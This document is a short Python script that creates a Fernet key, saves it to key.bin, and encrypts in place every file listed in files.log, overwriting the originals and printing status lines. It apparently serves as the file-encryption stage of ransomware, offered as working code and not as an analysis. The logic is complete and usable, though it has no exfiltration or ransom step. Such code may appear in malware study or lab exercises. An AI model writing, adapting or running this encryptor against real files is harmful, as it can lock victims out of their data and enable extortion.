import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("key.bin", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    with open("key.bin", "rb") as key_file:
        return key_file.read()

def encrypt_file(filepath, fernet):
    try:
        with open(filepath, "rb") as file:
            data = file.read()

        encrypted_data = fernet.encrypt(data)

        with open(filepath, "wb") as file:
            file.write(encrypted_data)

        print(f"[+] Encrypted: {filepath}")
    except Exception as e:
        print(f"[!] Error encrypting {filepath}: {e}")

def encrypt_from_log(log_file="files.log"):
    if not os.path.exists(log_file):
        print("[-] files.log not found.")
        return

    key = generate_key()
    fernet = Fernet(key)

    with open(log_file, "r") as f:
        file_paths = f.readlines()

    for path in file_paths:
        filepath = path.strip()
        if os.path.exists(filepath):
            encrypt_file(filepath, fernet)
        else:
            print(f"[-] File not found: {filepath}")

if __name__ == "__main__":
    encrypt_from_log()
